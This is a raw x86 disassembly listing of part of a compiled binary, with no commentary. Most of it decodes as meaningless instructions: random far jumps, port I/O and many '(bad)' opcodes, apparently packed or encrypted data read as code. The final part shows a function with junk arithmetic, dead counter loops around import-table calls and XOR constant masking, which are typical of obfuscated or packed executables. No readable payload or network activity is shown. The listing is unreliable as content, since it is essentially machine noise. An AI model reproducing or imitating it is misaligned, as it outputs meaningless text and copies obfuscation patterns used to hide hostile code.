  414452:	and    esp,DWORD PTR [ecx+0x4b]
  414455:	punpckhdq mm3,QWORD PTR [eax-0xe]
  414459:	stos   DWORD PTR es:[edi],eax
  41445a:	cmp    eax,ebp
  41445c:	dec    edx
  41445d:	test   eax,0xf376485f
  414462:	loope  0x41445b
  414464:	bound  esp,QWORD PTR [ecx]
  414466:	fs leave 
  414468:	jno    0x4143fd
  41446a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41446b:	test   BYTE PTR [bp+si],ch
  41446e:	pushf  
  41446f:	es dec ebx
  414471:	dec    ebx
  414472:	retf   0xa8bb
  414475:	push   ecx
  414476:	in     al,dx
  414477:	mov    cl,0x96
  414479:	lods   al,BYTE PTR ds:[esi]
  41447a:	push   es
  41447b:	call   0xcc588cea
  414480:	xchg   edi,eax
  414481:	sbb    ah,bh
  414483:	cmp    BYTE PTR [edx+0x2c],0x30
  414487:	xor    ebp,DWORD PTR ds:0x8b703297
  41448d:	iret   
  41448e:	mov    dh,0xc1
  414490:	std    
  414491:	ffree  st(5)
  414493:	fucomip st,st(2)
  414495:	stos   DWORD PTR es:[edi],eax
  414496:	jae    0x4144aa
  414498:	inc    ebx
  414499:	sub    BYTE PTR [edi+0x2e],0x8a
  41449d:	xlat   BYTE PTR ds:[ebx]
  41449e:	out    dx,eax
  41449f:	ja     0x414486
  4144a1:	push   es
  4144a2:	lgs    ecx,FWORD PTR [ebx+0x79]
  4144a6:	in     eax,dx
  4144a7:	jmp    0x3e64:0xa6e37394
  4144ae:	mov    bl,0xc5
  4144b0:	imul   esp,DWORD PTR [ebx-0x134461a3],0xffffffaa
  4144b7:	repz xor ebx,DWORD PTR [esi]
  4144ba:	mov    ss,WORD PTR [edi-0x1e713f10]
  4144c0:	mov    eax,0x65042b8d
  4144c5:	mov    cl,0x52
  4144c7:	jmp    0xa164:0x4024b2d1
  4144ce:	cmc    
  4144cf:	cs enter 0x2df2,0x62
  4144d4:	pushf  
  4144d5:	and    bh,BYTE PTR [edx-0xec7510a]
  4144db:	rol    DWORD PTR [edi+0x76],0x12
  4144df:	hlt    
  4144e0:	into   
  4144e1:	fst    DWORD PTR [ecx+0x62]
  4144e4:	in     al,0xbd
  4144e6:	mov    dl,0x47
  4144e8:	lds    edi,FWORD PTR [eax+edi*1+0x1]
  4144ec:	jmp    0xd9db442b
  4144f1:	ds (bad) 
  4144f3:	lds    esp,FWORD PTR [edi*8-0x44112ea8]
  4144fa:	push   esp
  4144fb:	mov    edi,0x9dfcd38d
  414500:	cli    
  414501:	mov    ds:0x84324ae0,eax
  414506:	test   BYTE PTR es:[edi],ah
  414509:	and    dl,BYTE PTR [ebx]
  41450b:	lds    edi,FWORD PTR [ecx+ecx*2]
  41450e:	retf   
  41450f:	loopne 0x414567
  414511:	popf   
  414512:	mov    esp,DWORD PTR [ebp+0x48]
  414515:	mov    ds:0xf9a758de,eax
  41451a:	fist   DWORD PTR [eax-0x71a009b1]
  414520:	cmovnp eax,DWORD PTR [edx+ecx*8-0x4660b8e6]
  414528:	idiv   DWORD PTR [esp+ecx*1-0x15]
  41452c:	out    0x7e,eax
  41452e:	ds clc 
  414530:	imul   edi,DWORD PTR [esi-0x6a],0xffffffdb
  414534:	pop    esi
  414535:	mov    dl,0x41
  414537:	(bad)  {k7}
  41453c:	lea    ebx,[ecx]
  41453e:	mov    dl,0x5a
  414540:	(bad)  
  414541:	mov    ebp,0xf5b050d0
  414546:	xchg   edx,eax
  414547:	ror    BYTE PTR [ebx],cl
  414549:	in     eax,0x3e
  41454b:	fdivp  st(0),st
  41454d:	dec    edi
  41454e:	cs dec edx
  414550:	fild   QWORD PTR [ebx+eax*4+0x493b7af7]
  414557:	or     eax,0x354a8527
  41455c:	bound  ebp,QWORD PTR [ebx+0x1e6d0fb2]
  414562:	inc    DWORD PTR [ebx]
  414564:	pop    edi
  414565:	fisubr WORD PTR [ecx-0x2]
  414568:	jle    0x414547
  41456a:	jno    0x414522
  41456c:	retf   0x5062
  41456f:	mov    al,ds:0xbcb37f46
  414574:	mov    ds:0x3b630197,eax
  414579:	stos   DWORD PTR es:[edi],eax
  41457a:	push   ecx
  41457b:	mov    ch,0x2b
  41457d:	mov    cl,0xa5
  41457f:	nop    DWORD PTR [ebp*8+0x1a7cb0e7]
  414587:	outs   dx,DWORD PTR ds:[esi]
  414588:	sbb    bh,cl
  41458a:	adc    eax,0xb768e704
  41458f:	jp     0x4145fd
  414591:	pop    ss
  414592:	sbb    ebp,DWORD PTR [ebx]
  414594:	and    ch,BYTE PTR [edi]
  414596:	or     eax,0xcb7fa138
  41459b:	mov    edx,0x32111fd9
  4145a0:	add    esp,edi
  4145a2:	mov    bh,0xe8
  4145a4:	stos   DWORD PTR es:[edi],eax
  4145a5:	(bad)  
  4145a6:	mov    cl,0x1e
  4145a8:	sub    BYTE PTR [eax],ch
  4145aa:	mov    eax,ds:0x9ba90701
  4145af:	xor    ebp,DWORD PTR [ebp-0x1a5f3b9]
  4145b5:	jns    0x4145f8
  4145b7:	nop
  4145b8:	push   ebx
  4145b9:	adc    eax,0x6be49522
  4145be:	sbb    al,0x43
  4145c0:	fmulp  st(7),st
  4145c2:	xlat   BYTE PTR ds:[ebx]
  4145c3:	lea    eax,[ebp+0x4b038bb5]
  4145c9:	inc    ebp
  4145ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145cb:	push   0x7d
  4145cd:	seta   BYTE PTR [eax-0x6c]
  4145d1:	out    0x49,eax
  4145d3:	stos   BYTE PTR es:[edi],al
  4145d4:	mov    dh,ch
  4145d6:	xchg   edi,eax
  4145d7:	sub    bh,BYTE PTR [eax]
  4145d9:	jno    0x4145e0
  4145db:	adc    DWORD PTR [edx+0x31ef5eed],eax
  4145e1:	fs icebp 
  4145e3:	cld    
  4145e4:	add    eax,0xab7d9ac9
  4145e9:	dec    esi
  4145ea:	inc    edi
  4145eb:	rcl    DWORD PTR [ebx+0x5bf6c0a1],1
  4145f1:	(bad)  
  4145f3:	mov    WORD PTR [ecx+eiz*8-0x4d8cfa12],ss
  4145fa:	dec    ecx
  4145fb:	lds    edi,FWORD PTR [edx-0x891eef4]
  414601:	mov    eax,ds:0x369388f
  414606:	pop    ecx
  414607:	out    0x5a,al
  414609:	out    dx,al
  41460a:	and    BYTE PTR [ebx-0x35ca9620],bh
  414610:	and    cl,bh
  414612:	pusha  
  414613:	cs jmp 0xf088:0xf631168c
  41461b:	rol    DWORD PTR [ebx+0x75],0x36
  41461f:	inc    esi
  414620:	movsx  edx,al
  414623:	mov    dh,0xc0
  414625:	inc    ebp
  414626:	lahf   
  414627:	adc    eax,0x668ccac0
  41462c:	mov    eax,ds:0xd20da697
  414631:	xchg   edi,eax
  414632:	mov    DWORD PTR [ebx],ebx
  414634:	cmp    al,0x82
  414636:	in     eax,0x5e
  414638:	push   ebx
  414639:	inc    esp
  41463a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41463b:	mov    ebp,0xa2c72ab9
  414640:	adc    edx,DWORD PTR [ecx]
  414642:	out    dx,al
  414643:	xor    esi,DWORD PTR [edi]
  414645:	xchg   ebx,eax
  414646:	rol    BYTE PTR [edi+0x65],0xd6
  41464a:	push   esi
  41464b:	inc    esi
  41464c:	repnz aam 0x5d
  41464f:	xchg   esp,eax
  414650:	popf   
  414651:	not    DWORD PTR [esi-0x1e]
  414654:	adc    edi,ebp
  414656:	xchg   edx,eax
  414657:	test   eax,0x5c97b271
  41465c:	(bad)  
  41465e:	mov    edx,0x27292e11
  414663:	adc    ah,BYTE PTR [edx-0x47]
  414666:	fwait
  414667:	ret    
  414668:	and    edx,DWORD PTR [ebp-0x12713df9]
  41466e:	inc    edx
  41466f:	push   eax
  414670:	push   esi
  414671:	and    eax,0xef54c475
  414676:	inc    edi
  414677:	aam    0x9f
  414679:	cmp    DWORD PTR [edi+0xede2978],eax
  41467f:	pop    ebx
  414680:	mov    esp,0x221a5897
  414685:	dec    ebp
  414686:	test   al,0x6c
  414688:	xlat   BYTE PTR ds:[ebx]
  414689:	or     al,0x69
  41468b:	call   0x5379:0x286eb728
  414692:	xchg   ebp,eax
  414693:	ret    0xdca3
  414696:	jge    0x414624
  414698:	and    BYTE PTR [esp+eax*4+0x11],0x40
  41469d:	inc    edx
  41469e:	loop   0x41462f
  4146a0:	sbb    eax,DWORD PTR [ebx+0x3adb8879]
  4146a6:	out    dx,eax
  4146a7:	ret    0x2398
  4146aa:	fwait
  4146ab:	fs sub al,0x13
  4146ae:	fld    TBYTE PTR ds:0x4ef140bf
  4146b4:	aad    0x2c
  4146b6:	cmp    al,0xc0
  4146b8:	(bad)  
  4146b9:	aam    0xba
  4146bb:	jle    0x4146bd
  4146bd:	fmul   st,st(1)
  4146bf:	sbb    eax,0x1ae9529e
  4146c4:	pop    eax
  4146c5:	shl    BYTE PTR [edx-0x30160a9f],0x9d
  4146cc:	dec    esp
  4146cd:	cmp    DWORD PTR [edi],0x11f58d36
  4146d3:	mov    ebp,0x6a49da34
  4146d8:	mov    BYTE PTR [ebp+0x14d85416],cl
  4146de:	shl    BYTE PTR [ecx],cl
  4146e0:	ficomp DWORD PTR [edx-0xe]
  4146e3:	pop    edi
  4146e4:	aas    
  4146e5:	popf   
  4146e6:	vorpd  ymm2,ymm7,YMMWORD PTR [ebp-0x5c8cc809]
  4146ee:	es fs adc eax,0xdba3b53b
  4146f5:	pop    ebx
  4146f6:	mov    ds:0x4b19369c,eax
  4146fb:	jge    0x4146fa
  4146fd:	leave  
  4146fe:	sahf   
  4146ff:	mov    ch,0x91
  414701:	mov    bl,0xf5
  414703:	or     dl,al
  414705:	inc    esi
  414706:	mov    WORD PTR [esi+0x539b6809],ds
  41470c:	jae    0x414720
  41470e:	cmp    BYTE PTR [ecx+0x4e75c3e4],0x5c
  414715:	xchg   esp,eax
  414716:	js     0x41478a
  414718:	sahf   
  414719:	call   0x676b7cd6
  41471e:	clc    
  41471f:	imul   esi,DWORD PTR gs:[ecx],0xa3e5bbcd
  414726:	push   0xcacaa0ff
  41472b:	sahf   
  41472c:	or     al,0xb0
  41472e:	cmp    DWORD PTR [edx],edx
  414730:	ret    
  414731:	push   ebp
  414732:	xchg   edi,eax
  414733:	int3   
  414734:	xor    al,0x5c
  414736:	cdq    
  414737:	dec    eax
  414738:	dec    edi
  414739:	dec    ebp
  41473a:	ins    DWORD PTR es:[edi],dx
  41473b:	fist   WORD PTR [ebp+0x4667cbc4]
  414741:	add    eax,0xabaa0dc8
  414746:	mov    bh,0x6e
  414748:	pop    ds
  414749:	popf   
  41474a:	mov    bh,0xd7
  41474c:	mov    edx,0x8e9d2acd
  414751:	(bad)  
  414752:	ds jo  0x41473a
  414755:	lods   eax,DWORD PTR ds:[esi]
  414756:	mov    ds:0x758f4e36,al
  41475b:	xor    esp,DWORD PTR [ecx-0x18]
  41475e:	jns    0x414721
  414760:	xor    esi,0x780041e3
  414766:	and    eax,0x4d97314d
  41476b:	sub    eax,0x5360045e
  414770:	fist   WORD PTR [ebp-0x5c]
  414773:	dec    esp
  414774:	in     eax,dx
  414775:	dec    ebx
  414776:	add    al,ah
  414778:	sbb    edx,DWORD PTR [edx+ebx*1]
  41477b:	mov    ah,0xa0
  41477d:	(bad)  
  41477e:	fbstp  TBYTE PTR [eax]
  414780:	addr16 mov ds:0x66ca,al
  414784:	lea    esp,[ebp-0x19]
  414787:	jbe    0x41471e
  414789:	outs   dx,BYTE PTR ds:[esi]
  41478a:	stc    
  41478b:	adc    esp,DWORD PTR [eax]
  41478d:	xor    al,0xe9
  41478f:	repz sub DWORD PTR [edx-0x1d9c1917],ebp
  414796:	js     0x414792
  414798:	test   al,0xc
  41479a:	repz push ebp
  41479c:	into   
  41479d:	xchg   edi,eax
  41479e:	pop    eax
  41479f:	inc    edi
  4147a0:	call   0xb09a:0xa9293082
  4147a7:	scas   al,BYTE PTR es:[edi]
  4147a8:	mov    ebx,0xf004fa7f
  4147ad:	and    BYTE PTR [ecx],ch
  4147af:	inc    esi
  4147b0:	jno    0x414790
  4147b2:	xchg   ecx,eax
  4147b3:	idiv   BYTE PTR [edi+0x37]
  4147b6:	data16 fsubp st(7),st
  4147b9:	sbb    ebp,esp
  4147bb:	push   0x5bee8e3f
  4147c0:	fwait
  4147c1:	jns    0x4147aa
  4147c3:	add    bh,BYTE PTR [eax]
  4147c5:	and    ebx,ebx
  4147c7:	ret    
  4147c8:	add    al,0x3a
  4147ca:	call   0xdd467450
  4147cf:	idiv   BYTE PTR [edi-0x3f752266]
  4147d5:	adc    BYTE PTR gs:[esi+eiz*4],ah
  4147d9:	mov    ecx,0xd42fb4d8
  4147de:	stos   DWORD PTR es:[edi],eax
  4147df:	hlt    
  4147e0:	cli    
  4147e1:	push   cs
  4147e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147e3:	mov    ecx,0x87d10bce
  4147e8:	mov    edx,0x19328f19
  4147ed:	sti    
  4147ee:	paddw  mm5,QWORD PTR [esp+edi*1]
  4147f2:	adc    esi,ebp
  4147f4:	inc    ecx
  4147f5:	pop    esp
  4147f6:	push   cs
  4147f7:	ficomp WORD PTR [edx]
  4147f9:	out    dx,al
  4147fa:	pop    cx
  4147fc:	pop    esi
  4147fd:	push   esi
  4147fe:	or     ebp,DWORD PTR [ecx-0x3dc48911]
  414804:	mov    ds:0x8e7d3611,eax
  414809:	push   ebp
  41480a:	jo     0x4147fd
  41480c:	add    BYTE PTR [edi],dh
  41480e:	inc    esp
  41480f:	inc    ebp
  414810:	dec    edx
  414811:	pop    es
  414812:	loopne 0x41481c
  414814:	dec    edi
  414815:	es cmp cl,dl
  414818:	or     BYTE PTR [ecx-0x7ec6b03],bl
  41481e:	xor    DWORD PTR ds:0xd8f93632,edx
  414824:	jmp    0xac0b:0x451a7370
  41482b:	push   eax
  41482c:	mov    bl,0x5a
  41482e:	arpl   WORD PTR [esi+0x8],sp
  414831:	out    0xe5,al
  414833:	out    dx,eax
  414834:	fs xchg edx,eax
  414836:	add    ecx,esi
  414838:	add    ebp,ecx
  41483a:	dec    edi
  41483b:	and    DWORD PTR [esi-0xb],0x576c2f5b
  414842:	cmp    BYTE PTR [eax+ebx*8],cl
  414845:	ret    0xc4e1
  414848:	adc    bl,bh
  41484a:	pop    ds
  41484b:	pop    ds
  41484c:	jecxz  0x41486a
  41484e:	nop
  41484f:	adc    eax,DWORD PTR [ecx]
  414851:	or     al,0x6
  414853:	push   edi
  414854:	div    BYTE PTR [edx+ebp*8]
  414857:	push   esp
  414858:	rcl    DWORD PTR [edx-0x13931a6e],0xfb
  41485f:	outs   dx,DWORD PTR ds:[esi]
  414860:	cmp    eax,DWORD PTR [eax]
  414862:	or     BYTE PTR [ebx-0x22f62431],dh
  414868:	aad    0xd9
  41486a:	xchg   esp,eax
  41486b:	stos   DWORD PTR es:[edi],eax
  41486c:	adc    bl,BYTE PTR [esi+edx*2-0x1c]
  414870:	sbb    bl,BYTE PTR [ebp-0x5d]
  414873:	int    0x77
  414875:	mov    ds:0xbe3e009d,eax
  41487a:	ret    0xfb87
  41487d:	test   eax,0xf256bc9e
  414882:	test   ebx,esi
  414884:	stc    
  414885:	push   ebx
  414886:	(bad)  
  414887:	mov    al,ds:0x859443f0
  41488c:	fistp  WORD PTR [ecx-0x4bfeea44]
  414892:	and    BYTE PTR [esi-0x21de0b62],ah
  414898:	xchg   edi,eax
  414899:	jge    0x4148ce
  41489b:	sahf   
  41489c:	scas   eax,DWORD PTR es:[edi]
  41489d:	cld    
  41489e:	dec    edx
  41489f:	jns    0x4148f9
  4148a1:	repnz xchg edx,eax
  4148a3:	stos   BYTE PTR es:[edi],al
  4148a4:	mov    bl,0x16
  4148a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148a7:	xchg   ebx,eax
  4148a8:	ret    
  4148a9:	and    eax,0xab35f8d7
  4148ae:	ins    DWORD PTR es:[edi],dx
  4148af:	or     BYTE PTR [esi-0x37f5afde],bl
  4148b5:	cmp    BYTE PTR [esp+esi*4-0xe43e0f6],0xc2
  4148bd:	sub    ch,0x35
  4148c0:	out    0x8b,eax
  4148c2:	jno    0x4148f7
  4148c4:	cmp    DWORD PTR [eax+ebx*8+0x76ca7c9e],edi
  4148cb:	sub    esi,DWORD PTR [ebx+0x1762402]
  4148d1:	pop    ebx
  4148d2:	call   0xd0d4c872
  4148d7:	nop
  4148d8:	retf   
  4148d9:	dec    esi
  4148da:	(bad)  
  4148db:	cmp    DWORD PTR [edi+0x46],0xcedddb1a
  4148e2:	ficomp DWORD PTR [eax+edx*4-0x19d4882e]
  4148e9:	rcl    BYTE PTR [ecx+0x28880fb4],1
  4148ef:	imul   BYTE PTR [ebp+0x2ae33cad]
  4148f5:	push   esp
  4148f6:	pop    ebx
  4148f7:	js     0x414892
  4148f9:	xchg   ebx,eax
  4148fa:	dec    edx
  4148fb:	xor    DWORD PTR [eax-0x62],eax
  4148fe:	ret    0xa9b5
  414901:	test   eax,0xb8f426a7
  414906:	enter  0x82c7,0x9b
  41490a:	pop    bp
  41490c:	jnp    0x414971
  41490e:	into   
  41490f:	idiv   DWORD PTR [edx-0x5385f8a0]
  414915:	jb     0x41498f
  414917:	mov    al,0x46
  414919:	out    dx,al
  41491a:	jo     0x41497f
  41491c:	lods   al,BYTE PTR ds:[esi]
  41491d:	cdq    
  41491e:	cmp    dh,BYTE PTR [ecx]
  414920:	xchg   ebp,eax
  414921:	push   esp
  414922:	inc    ebx
  414923:	xchg   ebp,eax
  414924:	adc    al,0xea
  414926:	retf   0x8ba2
  414929:	leave  
  41492a:	push   edi
  41492b:	cmp    al,0x97
  41492d:	sar    BYTE PTR [ecx+0x0],1
  414930:	pop    edi
  414931:	mov    eax,ebp
  414933:	das    
  414934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414935:	into   
  414936:	loopne 0x414903
  414938:	stc    
  414939:	and    bh,BYTE PTR [ebp+0x230407df]
  41493f:	aas    
  414940:	mov    cl,0x42
  414942:	ins    DWORD PTR es:[edi],dx
  414943:	mov    ebx,0x8c24e292
  414948:	inc    ecx
  414949:	or     esi,ecx
  41494b:	loope  0x4148f2
  41494d:	inc    ebp
  41494e:	push   edx
  41494f:	pop    eax
  414950:	jg     0x4149ce
  414952:	mov    eax,0xa28a1cf4
  414957:	stos   DWORD PTR es:[edi],eax
  414958:	(bad)
  41495d:	xchg   esp,eax
  41495e:	pop    ecx
  41495f:	scas   eax,DWORD PTR es:[edi]
  414960:	jge    0x4148e8
  414962:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414963:	add    esp,DWORD PTR [ebx+0x2c]
  414966:	pusha  
  414967:	dec    ebx
  414968:	int    0x5e
  41496a:	loope  0x41494a
  41496c:	daa    
  41496d:	cmp    edx,DWORD PTR [ebp+ebp*2+0x1b]
  414971:	jno    0x41499f
  414973:	mov    al,0xa5
  414975:	xor    DWORD PTR [ebx],ebx
  414977:	push   esi
  414978:	fist   DWORD PTR [edx]
  41497a:	add    al,BYTE PTR [esi+ebp*8+0x33009d17]
  414981:	push   ebp
  414982:	sbb    DWORD PTR [eax-0x612f53d1],ecx
  414988:	das    
  414989:	xchg   DWORD PTR [ebx-0x3d],ecx
  41498c:	rcl    DWORD PTR [edi-0x47],0x44
  414990:	in     eax,dx
  414991:	icebp  
  414992:	dec    esp
  414993:	div    DWORD PTR [esi-0x66112da1]
  414999:	or     BYTE PTR [ebp-0x2c],ch
  41499c:	cmp    dl,BYTE PTR [edi+0x16]
  41499f:	imul   esi,DWORD PTR [edx-0x637f408f],0xe9332c59
  4149a9:	and    eax,0x7d948e2b
  4149ae:	jecxz  0x414a03
  4149b0:	arpl   ax,ax
  4149b2:	rcr    DWORD PTR [ecx-0x44],cl
  4149b5:	inc    esp
  4149b6:	sti    
  4149b7:	jo     0x414a18
  4149b9:	stc    
  4149ba:	mov    dl,0x78
  4149bc:	sub    BYTE PTR [edi*4+0x7ceac491],dl
  4149c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149c4:	inc    edi
  4149c5:	sbb    al,0x90
  4149c7:	push   esp
  4149c8:	mov    edx,DWORD PTR [ebx-0xa]
  4149cb:	xchg   edx,eax
  4149cc:	mov    eax,0xad6f4ffd
  4149d1:	push   edi
  4149d2:	inc    ebx
  4149d3:	sub    BYTE PTR [ecx+0x39],dh
  4149d6:	mov    ds:0xe824ffd1,al
  4149db:	sub    BYTE PTR [ecx-0x5f7af346],bh
  4149e1:	pop    ss
  4149e2:	or     DWORD PTR [ebp+eax*2-0xda2ae1d],esi
  4149e9:	add    bl,ah
  4149eb:	lods   eax,DWORD PTR ds:[esi]
  4149ec:	dec    edx
  4149ed:	mov    esi,0xf742d937
  4149f2:	test   ch,ah
  4149f4:	adc    DWORD PTR [ecx+0x5a],0x36
  4149f8:	or     DWORD PTR ds:0xce6aec8d,0xd0c4427
  414a02:	pop    ss
  414a03:	(bad)  
  414a04:	cmp    edx,DWORD PTR [ebx-0x38]
  414a07:	mov    eax,ds:0xa8489980
  414a0c:	rcr    DWORD PTR [ecx-0x72],cl
  414a0f:	imul   ebx,DWORD PTR [ebx+0x654443b6],0xfffffff5
  414a16:	std    
  414a17:	arpl   WORD PTR [ecx],cx
  414a19:	(bad)
  414a1c:	add    DWORD PTR [ebp+0x29a25c48],eax
  414a22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a23:	lahf   
  414a24:	pop    ebp
  414a25:	sti    
  414a26:	mov    ebp,eax
  414a28:	cmp    esi,eax
  414a2a:	pop    edi
  414a2b:	imul   edx,DWORD PTR [edi+0x53ef06d7],0xffffff89
  414a32:	jmp    0x76ea965d
  414a37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a38:	dec    DWORD PTR [esi+0x7efd1888]
  414a3e:	cmc    
  414a3f:	pop    edi
  414a40:	jmp    0x97a:0x18e28c36
  414a47:	sub    eax,0x888dd869
  414a4c:	leave  
  414a4d:	sbb    ah,BYTE PTR [eax+0x3aee7146]
  414a53:	and    al,0x1c
  414a55:	dec    BYTE PTR [eax+0x1e]
  414a58:	dec    esp
  414a59:	dec    esi
  414a5a:	xchg   edi,eax
  414a5b:	xor    eax,edi
  414a5d:	xor    eax,0x5fa75556
  414a62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a63:	std    
  414a64:	ss loop 0x414a19
  414a67:	jecxz  0x414ab0
  414a69:	dec    edx
  414a6a:	dec    ebp
  414a6b:	mov    al,0x76
  414a6d:	jo     0x414a78
  414a6f:	jl     0x414a18
  414a71:	mov    edx,0xc25313ae
  414a76:	and    ebp,edi
  414a78:	mov    ebx,DWORD PTR [edi]
  414a7a:	sbb    cx,WORD PTR [eax-0x224b7384]
  414a81:	mov    ah,al
  414a83:	jmp    0x4dca75c5
  414a88:	mov    ah,0x8b
  414a8a:	dec    ebp
  414a8b:	or     BYTE PTR [edx-0x241fcdf],bh
  414a91:	sub    edx,ecx
  414a93:	add    edx,DWORD PTR [ebp-0x48]
  414a96:	mov    DWORD PTR [ebp-0x48],edx
  414a99:	mov    ecx,DWORD PTR [ebp+0x8]
  414a9c:	mov    edx,DWORD PTR [ebp-0x44]
  414a9f:	add    ecx,edi
  414aa1:	xor    ecx,edx
  414aa3:	mov    DWORD PTR [ebp-0x44],ecx
  414aa6:	mov    ecx,DWORD PTR [ebp+0x8]
  414aa9:	xor    ecx,eax
  414aab:	add    ecx,esi
  414aad:	jne    0x4126b9
  414ab3:	mov    ecx,DWORD PTR [ebp-0x8]
  414ab6:	xor    ecx,eax
  414ab8:	mov    eax,DWORD PTR [ebp+0x10]
  414abb:	add    ecx,esi
  414abd:	mov    DWORD PTR [eax],ecx
  414abf:	pop    edi
  414ac0:	pop    esi
  414ac1:	pop    ebx
  414ac2:	leave  
  414ac3:	ret    0xc
  414ac6:	push   ebp
  414ac7:	mov    ebp,esp
  414ac9:	sub    esp,0x78
  414acc:	mov    eax,ds:0x42a079
  414ad1:	xor    ecx,ecx
  414ad3:	xor    ecx,DWORD PTR ds:0x42a07d
  414ad9:	sub    eax,ecx
  414adb:	add    eax,DWORD PTR [eax+ecx*1]
  414ade:	push   esi
  414adf:	adc    DWORD PTR ds:0x428e29,ecx
  414ae5:	push   edi
  414ae6:	and    edi,0x4523
  414aec:	mov    eax,ds:0x428365
  414af1:	mov    DWORD PTR [ebp-0x24],eax
  414af4:	add    esi,DWORD PTR ds:0x428ed1
  414afa:	mov    eax,ds:0x428485
  414aff:	add    DWORD PTR ds:0x428e45,0x631e
  414b09:	mov    DWORD PTR [ebp-0x30],eax
  414b0c:	sub    esi,esi
  414b0e:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  414b15:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  414b1c:	xor    eax,ecx
  414b1e:	mov    eax,DWORD PTR [ebp-0x10]
  414b21:	or     DWORD PTR ds:0x428e35,0x297e
  414b2b:	mov    ecx,DWORD PTR [ebp-0x10]
  414b2e:	sub    eax,ecx
  414b30:	mov    DWORD PTR ds:0x428ea1,0x15
  414b3a:	cmp    DWORD PTR ds:0x428ea1,0x0
  414b41:	je     0x414b99
  414b47:	cmp    DWORD PTR ds:0x428ea1,0x5
  414b4e:	jb     0x414b99
  414b54:	jmp    0x414b6b
  414b59:	push   0x4280ea
  414b5e:	push   0x1
  414b60:	push   0x6e8b
  414b65:	call   DWORD PTR ds:0x42ca60
  414b6b:	cmp    DWORD PTR ds:0x428ea1,0x6
  414b72:	jne    0x414b87
  414b78:	xor    edi,edi
  414b7a:	or     edi,DWORD PTR ds:0x428ea1
  414b80:	dec    edi
  414b81:	mov    DWORD PTR ds:0x428ea1,edi
  414b87:	mov    edi,DWORD PTR ds:0x428ea1
  414b8d:	dec    edi
  414b8e:	mov    DWORD PTR ds:0x428ea1,edi
  414b94:	jmp    0x414b3a
  414b99:	mov    DWORD PTR [ebp-0x10],eax
  414b9c:	sub    DWORD PTR ds:0x428e75,0x4181
  414ba6:	xor    DWORD PTR [ebp-0x10],0xf89cb5b9
  414bad:	mov    eax,DWORD PTR [ebp-0x18]
  414bb0:	neg    edi
  414bb2:	mov    ecx,DWORD PTR [ebp-0x18]
  414bb5:	sub    eax,ecx
  414bb7:	mov    DWORD PTR [ebp-0x18],eax
  414bba:	or     DWORD PTR [ebp-0x18],0xf89f05b9
  414bc1:	add    DWORD PTR ds:0x428e31,0x596
  414bcb:	mov    eax,DWORD PTR [ebp-0xc]
  414bce:	adc    DWORD PTR ds:0x428e25,ebx
  414bd4:	mov    ecx,DWORD PTR [ebp-0xc]
  414bd7:	add    DWORD PTR ds:0x428e69,ecx
  414bdd:	sub    eax,ecx
  414bdf:	add    edi,0x58c9
  414be5:	mov    DWORD PTR [ebp-0xc],eax
  414be8:	or     DWORD PTR [ebp-0xc],0xf89c85f9
  414bef:	adc    ecx,0x6a40
  414bf5:	mov    eax,DWORD PTR [ebp-0x1c]
  414bf8:	mov    ecx,DWORD PTR [ebp-0x1c]
  414bfb:	adc    DWORD PTR ds:0x428ea5,ecx
  414c01:	sub    eax,ecx
  414c03:	xor    DWORD PTR ds:0x428e8d,edi
  414c09:	mov    DWORD PTR [ebp-0x1c],eax
  414c0c:	or     DWORD PTR [ebp-0x1c],0xf89c8599
  414c13:	mov    eax,DWORD PTR [ebp-0x20]
  414c16:	neg    DWORD PTR ds:0x428ea9
  414c1c:	mov    ecx,DWORD PTR [ebp-0x20]
  414c1f:	sub    eax,ecx
  414c21:	xor    esi,esi
  414c23:	xor    esi,DWORD PTR ds:0x4292f5
  414c29:	xor    edi,edi
  414c2b:	xor    edi,DWORD PTR ds:0x429bf5
  414c31:	sub    esi,edi
  414c33:	or     esi,DWORD PTR [esi+edi*1]
  414c36:	mov    DWORD PTR [ebp-0x20],eax
  414c39:	or     eax,edi
  414c3b:	mov    eax,DWORD PTR [ebp-0x2c]
  414c3e:	and    DWORD PTR ds:0x428e25,0x0
  414c48:	jmp    0x414c5a
  414c4d:	mov    esi,DWORD PTR ds:0x428e25
  414c53:	inc    esi
  414c54:	mov    DWORD PTR ds:0x428e25,esi
  414c5a:	cmp    DWORD PTR ds:0x428e25,0x1e
  414c61:	jae    0x414c93
  414c67:	cmp    DWORD PTR ds:0x428e25,0x2c
  414c6e:	jb     0x414c93
  414c74:	jmp    0x414c8e
  414c79:	push   0x42819a
  414c7e:	push   0x0
  414c80:	push   DWORD PTR [ebp-0x14]
  414c83:	push   0x541c
  414c88:	call   DWORD PTR ds:0x42ca64
  414c8e:	jmp    0x414c4d
  414c93:	mov    ecx,DWORD PTR [ebp-0x20]
  414c96:	mov    esi,0x75108b1
  414c9b:	xor    eax,esi
  414c9d:	adc    DWORD PTR ds:0x428ec9,0x2d36
  414ca7:	mov    edi,0x3272f8
  414cac:	and    DWORD PTR ds:0x428e91,0x428e49
  414cb6:	add    eax,edi
  414cb8:	or     eax,ecx
  414cba:	or     DWORD PTR ds:0x428e2d,0x148
  414cc4:	mov    DWORD PTR [ebp-0x20],eax
  414cc7:	mov    DWORD PTR ds:0x428e99,0x13
  414cd1:	cmp    DWORD PTR ds:0x428e99,0x0
  414cd8:	je     0x414d27
  414cde:	cmp    DWORD PTR ds:0x428e99,0x8
  414ce5:	jle    0x414d27
  414ceb:	jmp    0x414cf9
  414cf0:	push   DWORD PTR [ebp-0x20]
  414cf3:	call   DWORD PTR ds:0x42ca38
  414cf9:	cmp    DWORD PTR ds:0x428e99,0x9
  414d00:	jne    0x414d15
  414d06:	xor    ecx,ecx
  414d08:	add    ecx,DWORD PTR ds:0x428e99
  414d0e:	dec    ecx
  414d0f:	mov    DWORD PTR ds:0x428e99,ecx
